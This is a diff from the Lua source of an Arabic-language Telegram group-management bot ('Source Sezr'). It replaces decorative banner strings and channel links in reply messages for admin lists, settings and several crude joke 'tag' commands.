+t = "\n 🌕 قائمة الادمنيه \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7696,7 +7701,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8208,7 +8213,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح المميزين')
 end
 if text == ("المميزين") and Mod(msg) then
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
-t = "\n 🌕 قائمة مميزين الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة مميزين الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8224,7 +8229,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمميزين") or text == ("صيح المميزين") then
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8403,7 +8408,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح جميع المتوحدين')
 end
 if text == ("تاك للمتوحدين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
-t = "\n 🌕 قائمة متوحدين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/surccesezr)❳⟝┄┉┉━⧬\n"
+t = "\n 🌕 قائمة متوحدين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/A_F_fwdka1)❳⟝┄┉┉━⧬\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8472,7 +8477,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح جميع الزوجات')
 end
 if text == ("تاك للزوجات") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
-t = "\n 🌕 قائمه زوجات الجروب \n 🌕 ═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)❳═───═??\n"
+t = "\n 🌕 قائمه زوجات الجروب \n 🌕 ═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)❳═───═??\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8541,7 +8546,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح جميع الكلاب')
 end
 if text == ("تاك للكلاب") and Mod(msg) then
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
-t = "\n 🌕 قائمه كلاب الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمه كلاب الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8610,7 +8615,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع حمير من الج
 end
 if text == ("تاك للحمير") and Mod(msg) then
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
-t = "\n 🌕 قائمة حمير الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة حمير الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8680,7 +8685,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع وتكات الجر�
 end
 if text == ("تاك للوتكات") and Mod(msg) then
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
-t = "\n 🌕 قائمة وتكات الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة وتكات الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8749,7 +8754,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع القرده بال�
 end
 if text == ("تاك للقرود") and Mod(msg) then
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
-t = "\n 🌕 قائمة القرود الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة القرود الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8818,7 +8823,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع الارامل با�
 end
 if text == ("تاك لمايا خليفه") and Mod(msg) then
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
-t = "\n 🌕 قائمة مايا خليفه\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة مايا خليفه\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8887,7 +8892,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع الخولات با�
 end
 if text == ("تاك للخولات") and Mod(msg) then
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
-t = "\n 🌕 قائمة خولات الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة خولات الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8956,7 +8961,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع البقرات با�
 end
 if text == ("تاك للبقرات") and Mod(msg) then
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
-t = "\n 🌕 قائمة البقرات الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة البقرات الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9025,7 +9030,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع المزز بالج�
 end
 if text == ("تاك للمزز") and Mod(msg) then
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
-t = "\n 🌕 قائمة مزز الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة مزز الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9094,7 +9099,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع االاكساس')
 end
 if text == ("تاك للاكساس") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة كساس الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة كساس الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9162,7 +9167,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع القلوب ')
 end
 if text == ("تاك لقلبي") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة القلوب في الجروب\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة القلوب في الجروب\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9231,7 +9236,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع أولادي')
 end
 if text == ("تاك لولادي") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة كساس الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة كساس الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9300,7 +9305,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع االاكساس')
 end
 if text == ("تاك لبناتي") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة بناتي الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة بناتي الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9369,7 +9374,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع االاكساس')
 end
 if text == ("تاك للخاينين") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة الخاينين الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة الخاينين الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9438,7 +9443,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع زواحف')
 end
 if text == ("تاك للرقاصات") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة رقاصات الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة رقاصات الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9576,7 +9581,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح كل الحكاكين')
 end
 if text == ("تاك للحكاكين") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة حكاكين الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة حكاكين الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9644,7 +9649,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح كل النسوان بالجرو�
 end
 if text == ("تاك للنسوان") and Mod(msg) then
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
-t = "\n 🌕 قائمة نسوان الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة نسوان الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9712,7 +9717,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح جميع المتزوجين')
 end
 if text == ("تاك للمتزوجين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
-t = "\n 🌕 قائمه ازواج الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمه ازواج الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9781,7 +9786,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم تنزيل جميع االاكساس')
 end
 if text == ("تاك للميتنين") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n 🌕 قائمة الميتنين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة الميتنين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9849,7 +9854,7 @@ send(msg.chat_id_, msg.id_, '\n 🌕 تم مسح المحظورين')
 end
 if text == ("المحظورين") then
 local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
-t = "\n 🌕 قائمة محظورين الجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة محظورين الجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -10089,7 +10094,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح المكتومين')
 end
 if text == ("المكتومين") and Mod(msg) then
 local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
-t = "\n 🌕 قائمة المكتومين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المكتومين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -11217,13 +11222,13 @@ kickme = '✘'
 end
 NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
 local text = 
-'\n❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)❳'..
-'\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+'\n❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)❳'..
+'\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n 🌕 اعدادات الجروب كتالي ☆'..
-'\nء𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+'\nء⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n 🌕  علامة ال {✓} تعني مفعل'..
 '\n 🌕  علامة ال {✘} تعني معطل'..
-'\nء𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+'\nء⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n 🌕  الروابط  ⇇{ '..lock_links..
 ' }\n'..' 🌕  المعرفات  ⇇{ '..lock_user..
 ' }\n'..' 🌕  التاك  ⇇{ '..lock_hash..
@@ -11234,7 +11239,7 @@ local text =
 ' }\n'..' 🌕  الماركدون  ⇇{ '..lock_mark..
 ' }\n'..' 🌕  التعديل  ⇇{ '..lock_edit..
 ' }\n'..' 🌕  تعديل الميديا  ⇇{ '..lock_edit_med..
-' }\nء𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+' }\nء⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n'..' 🌕  الكلايش  ⇇{ '..lock_spam..
 ' }\n'..' 🌕  الكيبورد  ⇇{ '..lock_inlin..
 ' }\n'..' 🌕  الاغاني  ⇇{ '..lock_vico..
@@ -11243,7 +11248,7 @@ local text =
 ' }\n'..' 🌕  الدردشه  ⇇{ '..lock_text..
 ' }\n'..' 🌕   الفيديو  ⇇{ '..lock_ved..
 ' }\n'..' 🌕   الصور  ⇇{ '..lock_photo..
-' }\nء𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+' }\nء⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n'..' 🌕   الصوت  ⇇{ '..lock_muse..
 ' }\n'..' 🌕  الملصقات  ⇇{ '..lock_ste..
 ' }\n'..' 🌕  الجهات  ⇇{ '..lock_phon..
@@ -11254,10 +11259,10 @@ local text =
 ' }\n'..' 🌕  التكرار  ⇇{ '..flood..
 ' }\n'..' 🌕  الترحيب  ⇇{ '..welcome..
 ' }\n'..' 🌕  عدد التكرار  ⇇{ '..NUM_MSG_MAX..
-' }\nء⧬━┅┅┄⟞❲[᪣𝚁𝙰𝙼𝙱𝙾᪣](t.me/surccesezr)❳⟝┄┉┉━⧬'..
+' }\nء⧬━┅┅┄⟞❲[᪣𝚁𝙰𝙼𝙱𝙾᪣](t.me/A_F_fwdka1)❳⟝┄┉┉━⧬'..
 '\n 🌕  علامة ال {✓} تعني مفعل'..
 '\n 🌕  علامة ال {✘} تعني معطل'..
-'\nء𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'..
+'\nء⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'..
 '\n'..' 🌕  امر صيح  ⇇{ '..kickme..
 ' }\n'..' 🌕  امر اطردني  ⇇{ '..sehuser..
 ' }\n'..' 🌕  امر منو ضافني  ⇇{ '..addme..
@@ -11266,7 +11271,7 @@ local text =
 ' }\n'..' 🌕  الايدي  ⇇{ '..idgp..
 ' }\n'..' 🌕  الايدي بالصوره  ⇇{ '..idph..
 ' }\n'..' 🌕  الرفع  ⇇{ '..setadd..
-' }\n'..' 🌕  الحظر  ⇇{ '..banm..' }\n\n 🌕 ═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)❳═───═ 🌕 \n 🌕 قناة سورس السيزر𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n [ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)❳](t.me/surccesezr) \n'
+' }\n'..' 🌕  الحظر  ⇇{ '..banm..' }\n\n 🌕 ═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)❳═───═ 🌕 \n 🌕 قناة سورس السيزر⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n [ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)❳](t.me/A_F_fwdka1) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -11373,13 +11378,13 @@ if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf
 local TextZhrfa = text:match("^زخرفه (.*)$")
 zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
 zx = JSON.decode(zh)
-t = "\n 🌕 قائمه الزخرفه \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمه الزخرفه \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 i = 0
 for k,v in pairs(zx.ok) do
 i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
-send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘ٴ\n ☾ ❲[𝐒??𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐓𝐊𝐀](t.me/surccesezr)❳ 🌕 ')
+send(msg.chat_id_, msg.id_, t..'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ٴ\n ☾ ❲[𝐒??𝐔𝐑𝐂𝐄 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)❳ 🌕 ')
 end
 if text == "ضع رابط" or text == 'وضع رابط' then
 if msg.reply_to_message_id_ == 0  and Mod(msg) then  
@@ -11684,7 +11689,7 @@ end
 
 if text == "قائمه المنع" and Manager(msg) then   
 local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
-t = "\n 🌕 قائمة المنع \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المنع \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do  
 local DRAGON_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..v..msg.chat_id_)   
 t = t..""..k.."- "..v.."  ⇇{"..DRAGON_Msg.."}\n"    
@@ -11830,7 +11835,7 @@ return false
 end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
 local admins = result.members_  
-text = "\n 🌕 قائمة البوتات الموجوده \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+text = "\n 🌕 قائمة البوتات الموجوده \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 local n = 0
 local t = 0
 for i=0 , #admins do 
@@ -11849,7 +11854,7 @@ send(msg.chat_id_, msg.id_, " 🌕 لا توجد بوتات في الجروب")
 return false 
 end
 if #admins == i then 
-local a = '\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 عدد البوتات التي هنا >> {'..n..'} بوت\n'
+local a = '\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 عدد البوتات التي هنا >> {'..n..'} بوت\n'
 local f = ' 🌕 عدد البوتات التي هي ادمن >> {'..t..'}\n 🌕 ملاحضه علامة ال ( 🌕 ) تعني ان البوت ادمن \n'
 send(msg.chat_id_, msg.id_, text..a..f)
 end
@@ -11938,7 +11943,7 @@ if #list == 0 then
 send(msg.chat_id_, msg.id_,' 🌕 لا توجد صلاحيات مضافه')
 return false
 end
-t = "\n 🌕 قائمة الصلاحيات المضافه \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة الصلاحيات المضافه \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
 if var then
@@ -13008,7 +13013,7 @@ end
 
 if text == ("الردود") and Manager(msg) then
 local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
-text = " 🌕 قائمه الردود \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+text = " 🌕 قائمه الردود \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
